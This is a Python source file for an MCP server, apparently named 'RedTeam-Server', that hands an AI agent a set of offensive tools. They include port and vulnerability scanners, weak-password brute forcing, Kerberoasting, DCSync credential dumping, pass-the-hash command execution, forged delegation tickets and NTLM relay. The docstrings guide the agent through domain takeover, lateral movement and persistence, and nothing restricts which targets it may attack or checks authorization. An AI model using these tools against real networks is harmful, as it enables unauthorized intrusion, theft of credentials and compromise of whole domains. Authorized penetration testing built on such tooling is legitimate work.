import asyncio
import shlex
import subprocess
from mcp.server.fastmcp import FastMCP

# 初始化 RedTeam MCP 服务器
# 使用 mcp 官方提供的 FastMCP 快速构建工具库
mcp = FastMCP("RedTeam-Server")

async def run_command_with_timeout(command: list[str], timeout: int = 120) -> str:
    """
    异步运行系统命令，带有超时保护和标准输出捕获。
    避免网络工具长时间挂起导致 AI / 客户端阻塞。
    """
    try:
        # 启动子进程，并将输出重定向到 PIPE
        process = await asyncio.create_subprocess_exec(
            *command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # 增加超时等待机制
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
        
        output = stdout.decode('utf-8', errors='ignore')
        err_output = stderr.decode('utf-8', errors='ignore')
        
        # 即使进程返回非 0 状态码 (常常发生于漏洞探测工具)，也必须返回它的输出，让 AI 能看到真实情况
        if process.returncode != 0:
            return f"命令执行结束 (退出码 {process.returncode})。\n标准错误:\n{err_output}\n标准输出:\n{output}"
        
        return output if output else err_output
        
    except asyncio.TimeoutError:
        # 超时时必须杀掉进程
        process.kill()
        return f"执行失败: 命令执行超时 (超过了 {timeout} 秒)。网络连接或扫描可能有问题。"
    except FileNotFoundError:
        return f"执行失败: 找不到可执行文件 '{command[0]}'，请验证它是否在系统的环境变量 PATH 中。"
    except PermissionError:
        return f"执行失败: 权限被拒绝，如果你使用的是快捷方式（.lnk），请检查快捷方式的指向或以管理员权限运行。"
    except Exception as e:
        return f"执行失败: 发生未知异常: {str(e)}"

@mcp.tool()
async def invoke_native_port_scan(target: str, ports: str = "21,22,23,25,53,80,110,135,139,443,445,1433,1521,3306,3389,6379,8080,8443") -> str:
    """
    基于 Python 完全原生实现的高并发短平快端口扫描与服务探测。
    彻底取代 Nmap。无需系统底层网卡支持，无需安装任何额外程序或驱动。
    适用场景：当你想要快速确认某个 IP 开不开指定的核心服务端口(如 3389, 445 等)并拉取 Banner 时使用。
    
    :param target: 目标 IP (例如 '192.168.1.1')。不要填网段。
    :param ports: 逗号分隔的端口号 (默认包含最常见的高危红队入场端口)。
    """
    port_list = [int(p.strip()) for p in ports.split(",") if p.strip().isdigit()]
    
    async def _check_port(port):
        try:
            # 建立探针连接，2秒超时
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port), timeout=2.0
            ) 
            banner = ""
            try:
                # 尝试抓取 Banner 1秒钟
                data = await asyncio.wait_for(reader.read(256), timeout=1.0)
                if data:
                    banner = data.decode('utf-8', errors='ignore').strip().replace('\n', ' ')
            except:
                pass
            writer.close()
            await writer.wait_closed()
            return port, "Open", banner
        except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
            return port, "Closed", ""
            
    tasks = [_check_port(p) for p in port_list]
    scan_results = await asyncio.gather(*tasks)

    output = [f"=== 原生协议探针扫描: {target} ==="]
    open_count = 0
    for port, state, banner in scan_results:
        if state == "Open":
            open_count += 1
            output.append(f"[+] 端口 {port:<5} 开发 \t| Banner回显: {banner if banner else '无回显(可能是HTTP/空)'}")
            
    if open_count == 0:
        output.append("[-] 未发现开放的目标端口。")
    return "\n".join(output)

@mcp.tool()
async def invoke_nxc(protocol: str, target: str, args: str = "") -> str:
    """
    使用 NetExec (nxc) 进行跨协议网络渗透测试和信息收集。
    支持 smb, ssh, winrm, wmi, mssql 等。
    
    :param protocol: 协议名称 (如 'smb', 'ssh', 'winrm')。必须填写。
    :param target: 目标 IP、网段或主机名。
    :param args: nxc 的附加参数字符串 (如 '-u username -p password --shares')。
    """
    command = ["nxc", protocol, target]
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_gogo(target: str, args: str = "") -> str:
    """
    使用 gogo 扫描器进行快速资产和指纹识别。
    
    :param target: 目标 IP 或网段，将作为 '-i' 参数传入。
    :param args: 附加参数 (如 '-p 80,443' 或 '-m 1')。
    """
    command = ["gogo", "-i", target]
    if args:
         command.extend(shlex.split(args))
         
    return await run_command_with_timeout(command, timeout=240)


@mcp.tool()
async def invoke_fscan(target: str, args: str = "") -> str:
    """
    使用 fscan 进行快速内网资产扫描和漏洞发现。
    适用于内网大范围极速探活、弱口令爆破和常见漏洞(如 MS17-010, Weblogic)扫描。
    
    :param target: 目标 IP、网段或文件路径，对应 fscan 的 -h 参数 (例如 '192.168.1.1/24')。
    :param args: fscan 的附加参数 (例如 '-p 1-65535' 或 '-nobr' 跳过爆破)。
    """
    command = ["fscan", "-h", target]
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_httpx(target: str, args: str = "") -> str:
    """
    使用 httpx (ProjectDiscovery) 进行 HTTP 存活检测和指纹识别。
    适用于快速探测目标 Web 服务的存活状态、Title、状态码和中间件。
    
    :param target: 目标 IP、域名或目标列表文件 (例如 'example.com' 或 '192.168.1.1')。
    :param args: 附加参数 (例如 '-title -status-code -tech-detect')。可以在 args 里通过 -u 直接提供目标。
    """
    command = ["httpx"]
    if target and not target.startswith("-"):
        command.extend(["-u", target])
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_nuclei(target: str, templates: str = "", args: str = "") -> str:
    """
    使用 Nuclei 进行基于模板的定向漏洞扫描。
    适合在发现特定指纹后，使用特定的模板进行验证，避免盲目全量扫描。
    
    :param target: 目标 URL 或 IP。
    :param templates: 指定使用的模板名或路径 (例如 'cves/' 或 'technologies/wordpress/')。留空则执行默认范围。
    :param args: 附加参数 (例如 '-severity critical,high')。
    """
    command = ["nuclei", "-u", target]
    if templates:
        command.extend(["-t", templates])
    if args:
         command.extend(shlex.split(args))
         
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_ffuf(target: str, wordlist: str, args: str = "") -> str:
    """
    使用 ffuf 进行 Web 目录、隐藏文件、API 路由或内网虚拟主机名（VHost）的爆破与发现。
    适用场景：当 httpx 发现了某个内部 Web 服务，但首页是 403 或 404，你需要寻找后台入口、未授权 API 或遗留备份文件时。
    
    :param target: 目标 URL，必须包含 FUZZ 关键字 (例如 'http://192.168.1.1/FUZZ' 或 'http://FUZZ.corp.local')。
    :param wordlist: 字典文件所在的绝对路径 (例如 'd:/mcp/redteam-tools/dict.txt')。
    :param args: 附加参数，比如过滤长度、指定状态码 (例如 '-mc 200,301,302' 或 '-t 50')。
    """
    command = ["ffuf", "-u", target, "-w", wordlist]
    if args:
        command.extend(shlex.split(args))
    # 路径爆破耗时较长，给定足够超时时间
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_bloodhound_python(domain: str, dc_ip: str, auth_options: str, args: str = "-c All") -> str:
    """
    使用 bloodhound-python 收集 Active Directory (活动目录域) 的内部核心网络拓扑和权限路径。
    适用场景：当你在内网中获取了一个（即便权限极低的）域账号，你想分析域控路径、信任关系、是否有可利用的弱组策略或可委派权限。
    它不仅是收集工具，更是 AI 进行【域内提权攻击图谱分析】的无上利器！
    
    :param domain: 内部域的完整名称 (例如 'corp.local')。
    :param dc_ip: 域控制器的 IP 地址 (如 '192.168.1.10')。
    :param auth_options: 认证相关参数，由于涉及凭证，作为一个整体传入以支持明文密码或哈希传参 (如 '-u username -p password' 或者是 hashes)。
    :param args: 附加数据收集指令 (默认为 '-c All' 收集所有信息)。
    """
    command = ["bloodhound-python", "-d", domain, "-dc", dc_ip]
    if auth_options:
        command.extend(shlex.split(auth_options))
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_impacket_roasting(attack_type: str, domain: str, dc_ip: str, auth: str = "", args: str = "") -> str:
    """
    执行活动目录(AD)中的哈希提取攻击：AS-REP Roasting 或 Kerberoasting。
    适用场景：当你处于域外或拥有一个低权限域账号，想尝试获取其他(如服务账号、无预认证用户)的哈希以进行离线破解时。
    
    :param attack_type: "asreproast" (抓取无预认证用户的哈希) 或 "kerberoast" (抓取 SPN 服务账号的哈希)。
    :param domain: 域名 (如 'corp.local')。
    :param dc_ip: 域控 IP 地址。
    :param auth: 认证凭据格式 'user:pass'。如果是 asreproast 且没有密码，可以只填 'user' 或不填留空尝试匿名。
    :param args: 附加参数。Kerberoasting 通常需要 '-request'。例如 '-request -format hashcat'。
    """
    tool = "GetNPUsers.py" if attack_type.lower() == "asreproast" else "GetUserSPNs.py"
    command = [tool]
    if auth:
        command.append(f"{domain}/{auth}")
    else:
        command.append(domain + "/")
    command.extend(["-dc-ip", dc_ip])
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_dcsync(auth_uri: str, dc_ip: str = "", args: str = "") -> str:
    """
    使用 secretsdump.py 模拟域控执行 DCSync 攻击，导出全域或特定用户的 NTLM Hash / Kerberos 密钥。
    适用场景：你已经获取了域管(Domain Admin)或具有 Replicating Directory Changes 权限的域账号，准备接管整个域或做权限维持(黄金票据/白银票据)时进行哈希抽取。
    
    :param auth_uri: 认证与目标信息，格式为 'domain/username:password@target_ip' 或传 hashes时填 'domain/user@target_ip'。
    :param dc_ip: 域控 IP 地址 (如果 auth_uri 中的 target_ip 不是域控，则需要此参数指定域控)。
    :param args: 附加参数。使用 PtH: '-hashes LMHASH:NTHASH'。如果不需要全部导出，只查单个用户: '-just-dc-user username'。
    """
    command = ["secretsdump.py", auth_uri]
    if dc_ip:
        command.extend(["-dc-ip", dc_ip])
    if not args or "-just-dc" not in args:
        command.append("-just-dc") # DCSync 默认必需参数
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_pth_exec(auth_uri: str, cmd: str, args: str = "") -> str:
    """
    使用 wmiexec.py / psexec.py / smbexec.py 执行 Pass-the-Hash (PtH 过哈希) 横向移动，获取交互式命令执行结果。
    适用场景：当你通过前置攻击收集到了某个机器的 Local Admin 或域管的 NTHash，你想直接在这台机器上执行系统命令时。
    
    :param auth_uri: 认证与目标，格式为 'domain/user:pass@ip' 或 'domain/user@ip' (结合 -hashes 使用)。
    :param cmd: 要执行的系统命令 (例如 'whoami'、'ipconfig' 或 'powershell -c ...')。
    :param args: 附加参数。必须包含 PtH 哈希例如 '-hashes :NTHASH'，注意前面有一个冒号；也可以指定执行工具例如使用 psexec: '-exec psexec.py' (默认 wmiexec)。
    """
    # 默认使用较为隐蔽的 wmiexec
    tool = "wmiexec.py"
    # 如果 args 中包含了想要替换工具的意图，我们可以稍微做下转换，不过简单起见直接调 wmiexec
    command = [tool]
    if args:
        command.extend(shlex.split(args))
    command.extend([auth_uri, cmd])
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_delegation_ticket(spn: str, auth_uri: str, impersonate: str = "", dc_ip: str = "", args: str = "") -> str:
    """
    使用 getST.py 申请伪造的服务票据，执行域委派攻击 (约束委派 / 基于资源的约束委派 S4U2Self/S4U2Proxy)。
    适用场景：当你发现了一个配置了约束委派的机器账户(或其哈希/密码)，或者是利用基于资源的约束委派(RBCD)提权时，可以利用此工具伪造 Administrator 的票据。生成的 .ccache 文件可用于后续攻击。
    
    :param spn: 目标服务主体名称 (例如 'cifs/target.corp.local')。
    :param auth_uri: 具有委派权限的机器账号或用户账号凭据 (格式 'domain/user:pass' 或 'domain/user')。
    :param impersonate: 要伪造/模拟的域用户 (通常是 'Administrator')，触发 S4U2Self 流程。
    :param dc_ip: 域控 IP。
    :param args: 附加参数 (如 '-hashes LM:NT' 或指定输出票据名 '-out ticket.ccache')。
    """
    command = ["getST.py", "-spn", spn]
    if impersonate:
        command.extend(["-impersonate", impersonate])
    if dc_ip:
        command.extend(["-dc-ip", dc_ip])
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_ntlmrelayx(target: str, listen_time: int = 60, args: str = "") -> str:
    """
    非阻塞式收集：启动 ntlmrelayx.py 进行 NTLM Relay 攻击。
    说明：由于这是被动式监听工具，传统的终端运行会永远阻塞。此 Tool 会让该进程后台执行限定的时长 (listen_time 秒)，
    随后强制停止并返回这段时间内所有的终端日志以便 AI 研判。
    在此监听期间，你可以调度其他 Tool (如 responder) 或执行 Web 请求来触发 NTLM 认证。
    
    :param target: 收到 NTLM 认证后要中继转发到达的【目标 IP 或 URL】(例如 'smb://192.168.1.20' 或 'ldap://192.168.1.10')。
    :param listen_time: 工具持续挂机监听的时间 (秒)，超时将中止并回传结果。
    :param args: 附加指令 (例如 '-smb2support' 或 '-c "whoami"' 中继后执行的系统命令，或 ' -i ' 开启交互)。
    """
    command = ["ntlmrelayx.py", "-t", target]
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=listen_time)

if __name__ == "__main__":
    # 使用 stdio 模型运行 MCP (标准通信方式)
    mcp.run()
